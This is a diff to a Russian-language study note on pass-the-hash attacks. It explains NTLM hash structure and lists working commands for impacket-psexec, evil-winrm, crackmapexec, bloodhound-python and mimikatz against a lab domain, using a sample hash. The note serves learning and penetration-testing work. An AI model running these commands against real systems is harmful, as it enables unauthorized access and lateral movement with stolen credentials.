@@ -5,9 +5,9 @@
 
 NTLM хэш (NTHash) представляет собой следующую цепочку преобразований:
 
-_==Пароль пользователя==_ _==—>==_ _==UTF16-LE (LE - Little Endian)==_ _==—>==_ _==MD4==_
+Пароль пользователя —> UTF16-LE (LE - Little Endian) —> MD4
 
-==`test.local\pth-user:1114:aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450:::`==
+`test.local\pth-user:1114:aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450:::`
 
 ### Как видно, строка дампа состоит из 4х основных частей
 
@@ -40,7 +40,7 @@ _==Пароль пользователя==_ _==—>==_ _==UTF16-LE (LE - Little 
 
 Обычно, для этих целей используется PSexec из набора Impacket:
 
-`impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` ==`aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450`==
+`impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` `aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450`
 
 ![](../../../Attachments/Untitled_1_2.png)
 
@@ -50,23 +50,23 @@ _==Пароль пользователя==_ _==—>==_ _==UTF16-LE (LE - Little 
 
 На данный момент, LM хэш не является обязательным атрибутом для проведения атаки PTH. Как можно заметить, LM хэш для каждого пользователя из примера получения хэшей совпадает и начинается с `aad3b4…`. Такая особенность связана с хэшированием “пустого пароля”, поскольку в современных системах используется только NT хэш из-за слабой криптостойкости односторонней функции хэширования, и такая конструкция называется **“заглушкой”**. Именно поэтому, возможно использовать лишь NT хэш:
 
-`impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` ==`:8c2cf560d8d8abef7f13348b6aef1450`==
+`impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` `:8c2cf560d8d8abef7f13348b6aef1450`
 
 ![](../../../Attachments/Untitled_2_2.png)
 
 ## Основные утилиты, представляющие функционал для PTH
 
 - **psexec**
-    - `impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` ==`:8c2cf560d8d8abef7f13348b6aef1450`==
+    - `impacket-psexec -dc-ip 192.168.1.1 pth-user@test.local -hashes` `:8c2cf560d8d8abef7f13348b6aef1450`
 - **evil-winrm**
-    - `evil-winrm -i 192.168.1.1 -u “TEST\pth-user” --hash` ==`8c2cf560d8d8abef7f13348b6aef1450`==
+    - `evil-winrm -i 192.168.1.1 -u “TEST\pth-user” --hash` `8c2cf560d8d8abef7f13348b6aef1450`
 - **crackmapexec**
-    - `crackmapexec smb 192.168.1.1 -u pth.user -H` ==`8c2cf560d8d8abef7f13348b6aef1450`==
+    - `crackmapexec smb 192.168.1.1 -u pth.user -H` `8c2cf560d8d8abef7f13348b6aef1450`
 - **bloodhound-python**
-    - `bloodhound-python -u “pth-user” --hashes` ==`aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450`== `-ns 192.168.1.1 -d test.local -c all`
+    - `bloodhound-python -u “pth-user” --hashes` `aad3b435b51404eeaad3b435b51404ee:8c2cf560d8d8abef7f13348b6aef1450` `-ns 192.168.1.1 -d test.local -c all`
 - mimikatz.exe
     - `privilege::debug`
-    - `sekurlsa::pth /user:pth-user /domain:test /ntlm:`==`8c2cf560d8d8abef7f13348b6aef1450`== `/run:powershell.exe`
+    - `sekurlsa::pth /user:pth-user /domain:test /ntlm:``8c2cf560d8d8abef7f13348b6aef1450` `/run:powershell.exe`
 - **и т.д.**
 
 ## Меняется ли алгоритм аутентификации NTLM при PTH?
